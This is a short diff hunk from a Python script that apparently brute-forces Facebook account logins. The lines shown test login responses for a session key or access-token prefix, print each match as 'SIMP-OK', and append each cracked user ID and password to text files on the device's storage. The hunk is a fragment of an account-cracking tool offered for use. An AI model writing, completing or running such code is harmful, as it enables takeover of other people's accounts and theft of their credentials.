@@ -514,4 +514,21 @@ def _method_B_(uid, user):
             if 'session_key' in mtd_B or 'EAAA' in str(mtd_B):
                 print(f'\r\r{rad}[{green1}SIMP-OK{rad}] {G2}{uid} {rad}Â» {G2}{pw}')
                 oks.append(uid)
-                with open('/sdcard/SIMP--OLD-M2-OK.txt',
+                with open('/sdcard/SIMP--OLD-M2-OK.txt', 'a') as file:
+                    file.write(uid + '|' + pw + '\n')
+                break
+            elif 'session_key' in mtd_B or 'Please Confirm Email' in str(mtd_B):
+                print(f'\r\r{rad}[{green1}SIMP-OK{rad}] {G2}{uid} {rad}Â» {G2}{pw}')
+                oks.append(uid)
+                with open('/sdcard/SIMP--OLD-M2-OKK.txt', 'a') as file:
+                    file.write(uid + '|' + pw + '\n')
+                break
+            else:
+                continue
+        loop += 1
+    except Exception as e:
+        pass
+
+if __name__ == "__main__":
+   # if check_approval():
+    main()
